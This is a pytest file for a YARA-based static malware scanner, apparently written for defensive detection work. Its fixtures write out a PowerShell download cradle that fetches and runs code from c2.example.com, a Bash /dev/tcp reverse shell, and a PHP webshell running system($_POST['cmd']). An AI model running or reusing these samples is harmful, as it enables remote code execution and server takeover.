"""Unit and integration tests for Stage 2 Static Analysis:
YARA Engine Integration, MIT-Licensed Rules, and Threat Assessment.

Validates:
- Bundled rule compilation across all namespaces (eicar, packers, script_threats, webshells)
- True positive detection of EICAR test string with authoritative malicious verdict
- True positive detection of UPX compressed binaries with exact magic offsets (0xEC, 0x205)
- Informational packer handling without score inflation or duplicate factors
- Script threat detection (PowerShell download cradles, interactive Bash reverse shells)
- Generic webshell detection (PHP execution primitives with superglobals)
- False-positive validation against host stock and benign binaries (/bin/ls, notepad.exe, sigcheck64.exe, 7z.dll, nano)
- Custom user rule compilation and evaluation
"""

import os
import pytest

from app.services.static.pipeline import run_complete_static_pipeline
from app.services.static.yara_scanner import (
    compile_bundled_rules,
    get_bundled_rule_filepaths,
    scan_payload_yara,
)


def test_bundled_rules_compile_and_validate():
    """Verify that all bundled .yar rule files compile cleanly with valid metadata."""
    filepaths = get_bundled_rule_filepaths()
    assert len(filepaths) >= 4
    assert "eicar" in filepaths
    assert "packers" in filepaths
    assert "script_threats" in filepaths
    assert "webshells" in filepaths

    rules = compile_bundled_rules()
    assert rules is not None


def test_eicar_authoritative_detection_and_malicious_verdict():
    """Verify EICAR test string triggers authoritative detection and produces a malicious verdict."""
    eicar_bytes = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    
    # 1. Direct YARA scanner test
    yara_res = scan_payload_yara(eicar_bytes)
    assert yara_res["has_authoritative_match"] is True
    assert "EICAR_Standard_Antivirus_Test_File" in yara_res["matched_rule_names"]
    
    match = yara_res["matches"][0]
    assert match["rule"] == "EICAR_Standard_Antivirus_Test_File"
    assert match["meta"]["severity"] == "high"
    assert match["meta"]["verdict_impact"] == "authoritative"
    assert len(match["strings"]) >= 1
    assert match["strings"][0]["offset"] == 0
    assert match["strings"][0]["offset_hex"] == "0x00000000"

    # 2. Pipeline integration test
    pipeline_res = run_complete_static_pipeline(eicar_bytes)
    assert pipeline_res["verdict"] == "malicious"
    assert pipeline_res["static_risk_score"] >= 60
    assert "EICAR_Standard_Antivirus_Test_File" in pipeline_res["yara_rules"]
    assert any("EICAR" in f["factor"] for f in pipeline_res["assessment_factors"])


def test_upx_informational_detection_and_offsets():
    """Verify UPX-packed samples trigger informational packer detection with exact byte offsets."""
    ls_upx_path = "/tmp/heldout_eval/ls_upx_packed"
    notepad_upx_path = "/tmp/heldout_eval/notepad_upx.exe"

    if not os.path.exists(ls_upx_path) or not os.path.exists(notepad_upx_path):
        pytest.skip("Held-out UPX samples not present in /tmp/heldout_eval")

    # 1. ELF UPX Test
    with open(ls_upx_path, "rb") as f:
        ls_upx_bytes = f.read()
    res_elf = scan_payload_yara(ls_upx_bytes)
    assert "UPX_Compressed_Binary" in res_elf["matched_rule_names"]
    assert res_elf["has_authoritative_match"] is False
    assert res_elf["has_informational_match"] is True

    elf_upx_match = next(m for m in res_elf["matches"] if m["rule"] == "UPX_Compressed_Binary")
    assert elf_upx_match["meta"]["verdict_impact"] == "informational"
    offsets_elf = [s["offset"] for s in elf_upx_match["strings"]]
    assert 236 in offsets_elf, "Expected UPX! magic at offset 236 (0xEC) in ELF"

    # Pipeline output on ELF UPX
    pipe_elf = run_complete_static_pipeline(ls_upx_bytes)
    assert pipe_elf["verdict"] == "insufficient_evidence"
    assert pipe_elf["static_risk_score"] == 25
    # Must not duplicate factors
    upx_factors = [f for f in pipe_elf["assessment_factors"] if "upx" in f["factor"].lower()]
    assert len(upx_factors) == 1

    # 2. PE UPX Test
    with open(notepad_upx_path, "rb") as f:
        np_upx_bytes = f.read()
    res_pe = scan_payload_yara(np_upx_bytes)
    assert "UPX_Compressed_Binary" in res_pe["matched_rule_names"]
    
    pe_upx_match = next(m for m in res_pe["matches"] if m["rule"] == "UPX_Compressed_Binary")
    offsets_pe = [s["offset"] for s in pe_upx_match["strings"]]
    assert 517 in offsets_pe, "Expected UPX! magic at offset 517 (0x205) in PE"

    pipe_pe = run_complete_static_pipeline(np_upx_bytes)
    assert pipe_pe["verdict"] == "insufficient_evidence"
    assert pipe_pe["static_risk_score"] == 25


def test_powershell_download_cradle_threat_match():
    """Verify in-memory PowerShell download cradle triggers authoritative detection."""
    payload = (
        b"$client = New-Object System.Net.WebClient;\n"
        b"$code = $client.DownloadString('http://c2.example.com/payload.ps1');\n"
        b"IEX($code);\n"
    )
    yara_res = scan_payload_yara(payload)
    assert "PowerShell_Download_Cradle" in yara_res["matched_rule_names"]
    assert yara_res["has_authoritative_match"] is True

    pipe_res = run_complete_static_pipeline(payload)
    assert pipe_res["verdict"] == "malicious"
    assert any("PowerShell_Download_Cradle" in f["factor"] for f in pipe_res["assessment_factors"])


def test_bash_dev_tcp_reverse_shell_threat_match():
    """Verify interactive Bash /dev/tcp reverse shell idiom triggers authoritative detection."""
    payload = b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\n"
    yara_res = scan_payload_yara(payload)
    assert "Bash_Dev_TCP_Reverse_Shell" in yara_res["matched_rule_names"]
    assert yara_res["has_authoritative_match"] is True

    pipe_res = run_complete_static_pipeline(payload)
    assert pipe_res["verdict"] == "malicious"


def test_php_webshell_threat_match():
    """Verify PHP webshell pattern triggers authoritative detection."""
    payload = b"<?php\nif(isset($_POST['cmd'])){\n    system($_POST['cmd']);\n}\n?>"
    yara_res = scan_payload_yara(payload)
    assert "Generic_PHP_Webshell" in yara_res["matched_rule_names"]
    assert yara_res["has_authoritative_match"] is True

    pipe_res = run_complete_static_pipeline(payload)
    assert pipe_res["verdict"] == "malicious"


def test_benign_system_binaries_zero_false_positives():
    """Verify that benign host binaries and tools produce zero YARA rule matches."""
    sample_paths = [
        "/bin/ls",
        "/tmp/heldout_eval/notepad.exe",
        "/tmp/throwaway_eval/sigcheck64.exe",
        "/tmp/throwaway_eval/7z.dll",
        "/tmp/throwaway_eval/nano_ubuntu_jammy",
        "tests/probes/c_probe/probe_elf",
    ]

    for sp in sample_paths:
        if not os.path.exists(sp):
            continue
        with open(sp, "rb") as f:
            data = f.read()
        res = scan_payload_yara(data)
        assert len(res["matches"]) == 0, f"Expected 0 YARA matches on benign {sp}, got {res['matched_rule_names']}"


def test_custom_rule_compilation_and_matching():
    """Verify that dynamic custom user rules can be compiled and evaluated alongside bundled rules."""
    custom_rule = """
    rule Custom_Test_Artifact {
        meta:
            description = "Custom threat hunting signature"
            severity = "high"
            verdict_impact = "authoritative"
        strings:
            $marker = "OUTPOST_TEST_MARKER_99"
        condition:
            $marker
    }
    """
    sample = b"This is a test file containing OUTPOST_TEST_MARKER_99 within the data section."
    res = scan_payload_yara(sample, custom_rule_sources=[custom_rule])
    assert "Custom_Test_Artifact" in res["matched_rule_names"]
    assert res["has_authoritative_match"] is True

    clean_sample = b"This is a clean file without any markers."
    res_clean = scan_payload_yara(clean_sample, custom_rule_sources=[custom_rule])
    assert len(res_clean["matches"]) == 0
